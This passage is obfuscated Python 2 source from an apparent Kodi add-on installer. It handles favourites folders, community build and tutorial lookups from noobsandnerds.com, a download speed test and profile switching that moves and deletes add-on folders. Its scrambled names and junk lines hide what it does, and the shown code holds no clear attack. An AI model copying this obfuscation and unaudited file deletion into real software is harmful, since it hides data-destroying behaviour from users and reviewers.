def SF ( command , SF_folder , SF_link ) :
 IIiI = 'SF'
 if 70 - 70: OoooooooOO * i11iIiiIii
 O0OooOoOOoooO00oO = xbmc . translatePath ( os . path . join ( O0O , 'plugin.program.super.favourites' , 'Super Favourites' , SF_folder ) )
 ooOooOOoO0O = os . path . join ( O0OooOoOOoooO00oO , 'favourites.xml' )
 if 50 - 50: OOOOOOoo0O . I1IiiI
 if command == 'add' :
  if 93 - 93: OO000 % iIii1I11I1II1 * OOOOOOoo0O / OoOoOO00 * i11iIiiIii
  if not os . path . exists ( O0OooOoOOoooO00oO ) :
   os . makedirs ( O0OooOoOOoooO00oO )
   iiIi1I1i1 = open ( ooOooOOoO0O , mode = 'w+' )
   iiIi1I1i1 . write ( '<favourites>\n</favourites>' )
   iiIi1I1i1 . close ( )
   if 26 - 26: o0oOOoo . OOOOOOoo0O
   if 76 - 76: i1Ii11i1i % OoooooooOO
  i1iI1IIi1I = open ( ooOooOOoO0O , mode = 'r' )
  oo00i1i11I1I1 = i1iI1IIi1I . read ( )
  i1iI1IIi1I . close ( )
  if 15 - 15: I1IiiI . I1ii11iIi11i / iIii1I11I1II1 % OooO00OOoO00
  Oo00OoOoo = re . compile ( '<favourite name="[\s\S]*?\/favourites>' ) . findall ( oo00i1i11I1I1 )
  o0Oi1i1i11IIii = Oo00OoOoo [ 0 ] if ( len ( Oo00OoOoo ) > 0 ) else '\n</favourites>'
  if 11 - 11: o0oOOoo . i1Ii11i1i - OOOOOOoo0O . o0oOOo0O0Ooo
  if 41 - 41: ooOo / OoO0O00 - OoO0O00 + o0oOOoo * Oo
  iiIi1I1i1 = open ( Ii1iIiII1ii1 , mode = 'r' )
  i1IiIi1II11ii = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  if 30 - 30: OoO0O00 . OoO0O00 . OO000 % OO000 * i1IIi * ooOo
  if 74 - 74: OoooooooOO
  if not i1IiIi1II11ii in oo00i1i11I1I1 :
   iiIi1I1i1 = open ( ooOooOOoO0O , mode = 'w+' )
   if o0Oi1i1i11IIii == '\n</favourites>' :
    iIi1iii1 = iiIi1I1i1 . write ( '<favourites>\n\t' + i1IiIi1II11ii + o0Oi1i1i11IIii )
   else :
    iIi1iii1 = iiIi1I1i1 . write ( '<favourites>\n\t' + i1IiIi1II11ii + '\n\t' + o0Oi1i1i11IIii )
   iiIi1I1i1 . close ( )
   if 42 - 42: OooO00OOoO00 / i11iIiiIii
 if command == 'delete' :
  if 7 - 7: OooO00OOoO00
  if 50 - 50: i11iIiiIii . i11iIiiIii * i1IIi / i11iIiiIii . i1IIi - II111iiii
  try :
   i1iI1IIi1I = open ( ooOooOOoO0O , mode = 'r' )
   oo00i1i11I1I1 = i1iI1IIi1I . read ( )
   i1iI1IIi1I . close ( )
   if 72 - 72: iIii1I11I1II1 / o0oOOo0O0Ooo . I1ii11iIi11i
   if 78 - 78: iIii1I11I1II1 . i11iIiiIii % oOO00 * OO000 + OOOOOOoo0O - iIii1I11I1II1
   iiIi1I1i1 = open ( Ii1iIiII1ii1 , mode = 'r' )
   i1IiIi1II11ii = iiIi1I1i1 . read ( )
   iiIi1I1i1 . close ( )
   if 50 - 50: I1ii11iIi11i % OO000 - OooO00OOoO00 % Oo0Ooo - OooO00OOoO00 - I1IiiI
   if 99 - 99: oOO00 * OoOoOO00 - i1IIi / i1Ii11i1i . o0oOOoo % o0oOOo0O0Ooo
   iiIi1I1i1 = open ( ooOooOOoO0O , mode = 'w+' )
   iIi1iii1 = iiIi1I1i1 . write ( oo00i1i11I1I1 . replace ( '\n\t' + i1IiIi1II11ii , '' ) )
   iiIi1I1i1 . close ( )
  except :
   pass
   if 69 - 69: O0 . OOOOOOoo0O
   if 96 - 96: O0
 if command == 'delfolder' :
  if 89 - 89: I1ii11iIi11i - Oo0Ooo
  try :
   shutil . rmtree ( O0OooOoOOoooO00oO )
  except :
   pass
   if 26 - 26: o0oOOoo % o0oOOoo / II111iiii / OOOOOOoo0O
   if 2 - 2: i1IIi / i11iIiiIii + I1IiiI
def OO00O ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/Community_Builds/community_builds.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 ooO = re . compile ( 'author="(.+?)"' ) . findall ( i11i1ii1I )
 I1iI = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
 oOo00O0oo00o0 = I11IIIi [ 0 ] if ( len ( I11IIIi ) > 0 ) else ''
 ii1i1II = ooO [ 0 ] if ( len ( ooO ) > 0 ) else ''
 iII1iii = I1iI [ 0 ] if ( len ( I1iI ) > 0 ) else ''
 OO0o . ok ( oOo00O0oo00o0 , 'Author: [COLOR=dodgerblue]' + ii1i1II + '[/COLOR]      Latest Version: [COLOR=dodgerblue]' + iII1iii + '[/COLOR]' , '' , 'Click OK to view the build page.' )
 try :
  iIIi111IiII1i ( url + '&visibility=homepage' , url )
 except :
  return
  print "### Could not find build No. " + url
  OO0o . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 15 - 15: O0
  if 14 - 14: OOOOOOoo0O % o0oOOo0O0Ooo % o0oOOo0O0Ooo . Oo * I1ii11iIi11i - OO000
def ooOOooooo0Oo ( url ) :
 OO0o . ok ( "This build is not complete" , 'The guisettings.xml file was not copied over during the last install process. Click OK to go to the build page and complete Install Step 2 (guisettings fix).' )
 if 32 - 32: o0oOOoo / II111iiii . O0 . o0oOOoo % I1IiiI - o0oOOo0O0Ooo
 try :
  iIIi111IiII1i ( url + '&visibility=homepage' , url )
  if 69 - 69: OO000 - I1IiiI * Oo . iIii1I11I1II1 * OoOoOO00 . OoooooooOO
 except :
  return
  print "### Could not find build No. " + url
  OO0o . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 6 - 6: O0 . o0oOOo0O0Ooo - OoOoOO00
  if 3 - 3: OoooooooOO % iIii1I11I1II1 * i1Ii11i1i % Oo0Ooo + iIii1I11I1II1
def oOOO0o00 ( ) :
 IiII111i1i11 ( '' , '[COLOR=dodgerblue]Check For Social Updates[/COLOR]' , 'http://tlbb.me/comm.php?z=c&x=' , 'grab_updates' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=grey]Friend Requests (Coming Soon)[/COLOR]' , '' , '' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=grey]My Content (Coming Soon)[/COLOR]' , '' , '' , '' , '' , '' , '' )
 if 92 - 92: OooO00OOoO00 / I1IiiI * iIii1I11I1II1 / o0oOOoo + oOO00
 if 30 - 30: ooOo . i11iIiiIii / OooO00OOoO00 + i1IIi - OooO00OOoO00
def II1I11 ( url , type ) :
 if type == 'communitybuilds' :
  iIII = 'grab_builds'
  if url . endswith ( "visibility=premium" ) :
   IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( O0oo0OO0 ) + '&token=' + I1i1iiI1 + '&visibility=premium' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=reseller_private" ) :
   IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( O0oo0OO0 ) + '&token=' + I1i1iiI1 + '&visibility=reseller_private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=public" ) :
   IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if type == 'tutorials' :
  iIII = 'grab_tutorials'
 if type == 'hardware' :
  iIII = 'grab_hardware'
 if type == 'addons' :
  iIII = 'grab_addons'
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , iIII , 'Popular.png' , '' , '' , '' )
 if type == 'hardware' :
  IiII111i1i11 ( 'folder' , '[COLOR=lime]Filter Results[/COLOR]' , url , 'hardware_filter_menu' , 'Filter.png' , '' , '' , '' )
 if type != 'addons' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , iIII , 'Popular.png' , '' , '' , '' )
 if type == 'tutorials' or type == 'hardware' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=Added&orderx=DESC' , iIII , 'Latest.png' , '' , '' , '' )
 else :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , iIII , 'Latest.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , iIII , 'Recently_Updated.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , iIII , 'AtoZ.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Z-A[/COLOR]' , str ( url ) + '&sortx=name&orderx=DESC' , iIII , 'ZtoA.png' , '' , '' , '' )
 if type == 'public_CB' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , 'Search_Genre.png' , '' , '' , '' )
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Sort by Country/Language[/COLOR]' , url , 'countries' , 'Search_Country.png' , '' , '' , '' )
  if 41 - 41: OO000 * OooO00OOoO00
  if 13 - 13: Oo0Ooo * o0oOOo0O0Ooo * OOOOOOoo0O
def o0Ooo0 ( ) :
 TXT . TXT ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=darkcyan]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Thank you, [COLOR=dodgerblue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution Team.' )
 if 96 - 96: o0oOOoo + OoO0O00 * II111iiii * ooOo
 if 48 - 48: I1ii11iIi11i - Oo0Ooo - o0oOOoo . o0oOOo0O0Ooo . o0oOOo0O0Ooo
def ii1oO0Oo ( ) :
 IiII111i1i11 ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , 'howto.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Download 16MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/16MB.txt' , 'runtest' , 'Download16.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Download 32MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/32MB.txt' , 'runtest' , 'Download32.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Download 64MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/64MB.txt' , 'runtest' , 'Download64.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Download 128MB file - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/128MB.txt' , 'runtest' , 'Download128.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Download 10MB file   - [COLOR=darkcyan]Server 2[/COLOR]' , 'http://www.wswd.net/testdownloadfiles/10MB.zip' , 'runtest' , 'Download10.png' , '' , '' , '' )
 if 12 - 12: OO000
def iIIIi1Iii1 ( ) :
 IiiIiIIi1 = open ( OOO00 ) . read ( )
 oOoOOOo0oo = IiiIiIIi1 . replace ( 'checknews.py,silent=true),00:00:20' , 'checknews.py,silent=true),00:30:00' )
 O000Oo0O = 'Test mode now DISABLED. Normal update mode resumed, updates will now check every 30 minutes.'
 xbmc . executebuiltin ( 'StopScript(special://home/addons/plugin.program.tbs/service.py)' )
 xbmc . executebuiltin ( 'RunScript(special://home/addons/plugin.program.tbs/service.py)' )
 if 100 - 100: i11iIiiIii * OOOOOOoo0O * o0oOOoo
 if 19 - 19: oOO00
 xbmc . executebuiltin ( 'Container.Refresh' )
 oo00IIIIIIIiI = open ( OOO00 , mode = 'w' )
 oo00IIIIIIIiI . write ( str ( oOoOOOo0oo ) )
 oo00IIIIIIIiI . close ( )
 OO0o . ok ( 'SUCCESS' , O000Oo0O )
 if 32 - 32: OOOOOOoo0O / oOO00 / OoO0O00 . I1IiiI
def OOoooOOO0 ( name ) :
 if 75 - 75: i1Ii11i1i . iIii1I11I1II1 + oOO00 % Oo0Ooo
 Ooo . create ( 'Creating Profile' , '' , '' , '' )
 IiII1i11III = iIIIi1iii1I11 ( name )
 if 99 - 99: Oo . iIii1I11I1II1
 if 45 - 45: i1Ii11i1i - O0 . i1Ii11i1i / i1Ii11i1i / OoOoOO00
 iIIIi1IiI11I1 = [ ]
 for iiiiIii11i1 in os . listdir ( IIiiiiiiIi1I1 ) :
  iIIIi1IiI11I1 . append ( iiiiIii11i1 )
  if 12 - 12: Oo
  if 75 - 75: Oo + OO000 + ooOo . Oo0Ooo
  O0O0oOoO0O0oO = open ( os . path . join ( o0 , name , 'addonlist' ) , mode = 'r' )
  iIiI = O0O0oOoO0O0oO . read ( )
  O0O0oOoO0O0oO . close ( )
  iIiI = iIiI . split ( '|' )
  if 71 - 71: i1Ii11i1i
  if 56 - 56: o0oOOo0O0Ooo * iIii1I11I1II1 . OO000 + OoOoOO00 % i1Ii11i1i
 oo0OOoooo0O0 ( 'profiles' )
 for iiiiIii11i1 in os . listdir ( ooooooO0oo ) :
  if not iiiiIii11i1 in iIIIi1IiI11I1 and iiiiIii11i1 != 'plugin.program.totalinstaller' and iiiiIii11i1 != 'script.module.addon.common' and iiiiIii11i1 != 'repository.noobsandnerds' and iiiiIii11i1 != 'packages' :
   try :
    shutil . copytree ( os . path . join ( ooOOoooooo , 'addons' , iiiiIii11i1 ) , os . path . join ( o0 , 'Master' , 'backups' , iiiiIii11i1 ) )
    if I11 == 'true' :
     print "### Successfully copied " + iiiiIii11i1 + " to " + os . path . join ( o0 , 'Master' , 'backups' , iiiiIii11i1 )
   except :
    print "### Failed to copy " + iiiiIii11i1 + " to backup folder, must already exist"
   if not iiiiIii11i1 in iIiI and iiiiIii11i1 != O0ii1ii1ii :
    try :
     os . rename ( os . path . join ( ooooooO0oo , iiiiIii11i1 ) , os . path . join ( o0 , 'Master' , iiiiIii11i1 ) )
    except :
     try :
      shutil . copytree ( os . path . join ( ooooooO0oo , iiiiIii11i1 ) , os . path . join ( o0 , 'Master' , iiiiIii11i1 ) )
     except :
      try :
       shutil . rmtree ( os . path . join ( ooooooO0oo , iiiiIii11i1 ) )
      except :
       print "### Unable to move " + iiiiIii11i1 + " as it's currently in use"
 shutil . rmtree ( ooOOoooooo )
 if 11 - 11: Oo
 if 12 - 12: OoooooooOO * Oo * I1ii11iIi11i * o0oOOoo
 for iiiiIii11i1 in iIiI :
  if not iiiiIii11i1 in iIIIi1IiI11I1 and not iiiiIii11i1 in ooooooO0oo :
   try :
    os . rename ( os . path . join ( o0 , 'Master' , iiiiIii11i1 ) , os . path . join ( ooooooO0oo , iiiiIii11i1 ) )
   except :
    pass
    if 26 - 26: OoooooooOO . i1IIi + OoO0O00
 Ii1I11II1IiI ( )
 oo00o0Oo0O0 ( )
 OOo00 ( iiIiI )
 print "### WIPE FUNCTIONS COMPLETE"
 if 36 - 36: i1IIi % i1Ii11i1i * Oo0Ooo
 try :
  iiIi1I1i1 = open ( O0Oo000ooO00 , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  print "### original idfile contents: " + IiiI
 except :
  print "### original id file does not exist"
  if 75 - 75: I1IiiI . OOOOOOoo0O % OOOOOOoo0O * i11iIiiIii + i1IIi * Oo0Ooo
 try :
  extract . all ( os . path . join ( o0 , name , 'build.zip' ) , O0o0Oo , Ooo )
  o0O00oo0O = 1
  print "### Extraction of build successful"
 except :
  OO0o . ok ( 'Error' , "Sorry it wasn't possible to extract your build, there is a problem with your build zip file." )
  o0O00oo0O = 0
 if os . path . exists ( os . path . join ( O0O , 'plugin.program.totalinstaller' , 'id.xml' ) ) and os . path . exists ( os . path . join ( O0O , 'ti_id' , 'id.xml' ) ) :
  print "### id.xml and temporary id.xml exists, attempting remove of original and replace with temp"
  os . remove ( os . path . join ( O0O , 'plugin.program.totalinstaller' , 'id.xml' ) )
  print "### removal ok"
  os . rename ( os . path . join ( O0O , 'ti_id' , 'id.xml' ) , os . path . join ( O0O , 'plugin.program.totalinstaller' , 'id.xml' ) )
  print "### rename ok"
 if os . path . exists ( os . path . join ( O0O , 'plugin.program.totalinstaller' , 'startup.xml' ) ) and os . path . exists ( os . path . join ( O0O , 'ti_id' , 'startup.xml' ) ) :
  print "### startup.xml and temporary startup.xml exists, attempting remove of original and replace with temp"
  os . remove ( os . path . join ( O0O , 'plugin.program.totalinstaller' , 'startup.xml' ) )
  print "### removal ok"
  os . rename ( os . path . join ( O0O , 'ti_id' , 'startup.xml' ) , os . path . join ( O0O , 'plugin.program.totalinstaller' , 'startup.xml' ) )
  print "### rename ok"
  if 98 - 98: OO000 - OoooooooOO * OooO00OOoO00 * ooOo % I1ii11iIi11i * II111iiii
 iiIi1I1i1 = open ( O0Oo000ooO00 , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 if 86 - 86: i11iIiiIii / OooO00OOoO00 * OOOOOOoo0O - OOOOOOoo0O
 print "### new idfile contents: " + IiiI
 if 32 - 32: Oo0Ooo . O0
 if o0O00oo0O == 1 :
  OOo00O0O ( )
  if 48 - 48: I1ii11iIi11i % II111iiii + OooO00OOoO00
  if 25 - 25: oOO00 * o0oOOo0O0Ooo / I1IiiI . oOO00 % II111iiii
def iI1II1iiI11iI ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]DELETE A BUILD[/COLOR]' , url , 'delete_profile' , '' , '' , '' )
 for oOo00O0oo00o0 in os . listdir ( o0 ) :
  if oOo00O0oo00o0 != 'Master' and oOo00O0oo00o0 != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   IiII111i1i11 ( '' , 'Load Profile: [COLOR=dodgerblue]' + oOo00O0oo00o0 . replace ( '_' , ' ' ) + '[/COLOR]' , oOo00O0oo00o0 , 'switch_profile' , '' , '' , '' , '' )
   if 8 - 8: OOOOOOoo0O + I1ii11iIi11i . OO000
   if 50 - 50: Oo0Ooo
   if 16 - 16: OO000 - OoOoOO00 % Oo0Ooo / OO000 . OooO00OOoO00 + o0oOOoo
def ooOOoo0 ( url ) :
 try :
  i1I11I1iIii , i11IiIi = url . split ( '|' )
  TXT . TXT ( i1I11I1iIii , i11IiIi )
 except :
  TXT . TXT ( '' , url )
  if 5 - 5: OO000 / o0oOOo0O0Ooo + oOO00 * OoooooooOO
  if 52 - 52: OoO0O00 . II111iiii
def oOo0OO00O0O ( ) :
 IiIi1iIIIiIiI11II1i = time . time ( )
 II1i111i = time . localtime ( IiIi1iIIIiIiI11II1i )
 return time . strftime ( '%Y%m%d%H%M%S' , II1i111i )
 if 35 - 35: o0oOOo0O0Ooo
 if 84 - 84: I1ii11iIi11i + o0oOOoo % oOO00 / II111iiii + i11iIiiIii
def II1I1 ( ) :
 if IioO0O ( ) :
  IiII111i1i11 ( '' , '[COLOR=darkcyan]Wi-Fi Settings[/COLOR]' , '' , 'openelec_settings' , 'Wi-Fi.png' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=gold]CLEAN MY KODI FOLDERS (Save Space)[/COLOR]' , '' , 'full_clean' , '' , '' , '' , '' )
 if O0i1II1Iiii1I11 != '' :
  IiII111i1i11 ( '' , O0i1II1Iiii1I11 + ' Keyword Install' , Oo0oO0ooo , 'keywords' , 'Keywords.png' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Backup Download Folder Check' , 'url' , 'check_storage' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Backup/Restore My Content' , 'none' , 'backup_restore' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Advanced Options' , '' , 'advanced_tools' , '' , '' , '' , '' )
 if 50 - 50: OoO0O00 / OooO00OOoO00 . i11iIiiIii
 if 84 - 84: OoooooooOO . OoO0O00 / OoOoOO00 * i1IIi
def iii111III1ii1 ( ) :
 IiII111i1i11 ( '' , 'Check For Special Characters In Filenames' , '' , 'ASCII_Check' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Clear All Cache Folders' , 'url' , 'clear_cache' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Clear Cached Artwork (thumbnails & textures)' , 'none' , 'remove_textures' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Clear Packages Folder' , 'url' , 'remove_packages' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Completely remove an add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Convert Physical Paths To Special' , O0o0Oo , 'fix_special' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Delete Addon_Data' , 'url' , 'remove_addon_data' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Passwords - Hide when typing in' , 'none' , 'hide_passwords' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Passwords - Unhide when typing in' , 'none' , 'unhide_passwords' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Upload Log' , 'none' , 'uploadlog' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'View My Log' , 'none' , 'log' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Wipe My Install (Fresh Start)' , 'none' , 'wipe_xbmc' , '' , '' , '' , '' )
 if 16 - 16: II111iiii + OoO0O00 * i11iIiiIii - iIii1I11I1II1 / I1ii11iIi11i + i1IIi
 if 86 - 86: OoooooooOO . OoO0O00
def Oo0o0o0o ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]1. Add-on Maintenance[/COLOR]' , str ( url ) + '&type=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Audio Add-ons' , str ( url ) + '&type=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Picture Add-ons' , str ( url ) + '&type=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Program Add-ons' , str ( url ) + '&type=Programs' , 'grab_tutorials' , 'Programs.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Video Add-ons' , str ( url ) + '&type=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 if 55 - 55: oOO00 + i1Ii11i1i % O0 % OoO0O00 * oOO00 % Oo
 if 95 - 95: OoooooooOO / OOOOOOoo0O
def Iii1ii ( url ) :
 i1iiiIii11 = 'http://noobsandnerds.com/TI/TutorialPortal/downloadcount.php?id=%s' % ( url )
 try :
  o0OO0o0o00o ( i1iiiIii11 )
 except :
  pass
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/TutorialPortal/tutorialdetails.php?id=%s' % ( url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I11IIIi = re . compile ( 'name="(.+?)"' ) . findall ( i11i1ii1I )
 ooO = re . compile ( 'author="(.+?)"' ) . findall ( i11i1ii1I )
 oOOO0OO = re . compile ( 'video_guide1="(.+?)"' ) . findall ( i11i1ii1I )
 I11ii1iI11 = re . compile ( 'video_guide2="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii111i1ii = re . compile ( 'video_guide3="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0O = re . compile ( 'video_guide4="(.+?)"' ) . findall ( i11i1ii1I )
 IiIiiI1ii111 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( i11i1ii1I )
 i11ii1 = re . compile ( 'video_label1="(.+?)"' ) . findall ( i11i1ii1I )
 Ii111I11 = re . compile ( 'video_label2="(.+?)"' ) . findall ( i11i1ii1I )
 Oo0O0oo = re . compile ( 'video_label3="(.+?)"' ) . findall ( i11i1ii1I )
 o0O0 = re . compile ( 'video_label4="(.+?)"' ) . findall ( i11i1ii1I )
 oO0o0 = re . compile ( 'video_label5="(.+?)"' ) . findall ( i11i1ii1I )
 IiiI11ii1II1 = re . compile ( 'about="(.+?)"' ) . findall ( i11i1ii1I )
 IIi1oo0oOOo0 = re . compile ( 'step1="(.+?)"' ) . findall ( i11i1ii1I )
 oOOi1Ii = re . compile ( 'step2="(.+?)"' ) . findall ( i11i1ii1I )
 O0Oo0Oo000 = re . compile ( 'step3="(.+?)"' ) . findall ( i11i1ii1I )
 ooo0Oo00000oooO = re . compile ( 'step4="(.+?)"' ) . findall ( i11i1ii1I )
 iIiiiiIi111I = re . compile ( 'step5="(.+?)"' ) . findall ( i11i1ii1I )
 ooOo00oOOOO0 = re . compile ( 'step6="(.+?)"' ) . findall ( i11i1ii1I )
 iii1IiIiII1 = re . compile ( 'step7="(.+?)"' ) . findall ( i11i1ii1I )
 O00oo00O0OO0ooO = re . compile ( 'step8="(.+?)"' ) . findall ( i11i1ii1I )
 iIi1I = re . compile ( 'step9="(.+?)"' ) . findall ( i11i1ii1I )
 OO0O0ooOo = re . compile ( 'step10="(.+?)"' ) . findall ( i11i1ii1I )
 iI11 = re . compile ( 'step11="(.+?)"' ) . findall ( i11i1ii1I )
 iI1ii111II = re . compile ( 'step12="(.+?)"' ) . findall ( i11i1ii1I )
 oo0Oo0oo = re . compile ( 'step13="(.+?)"' ) . findall ( i11i1ii1I )
 o0Ooo0oOoo = re . compile ( 'step14="(.+?)"' ) . findall ( i11i1ii1I )
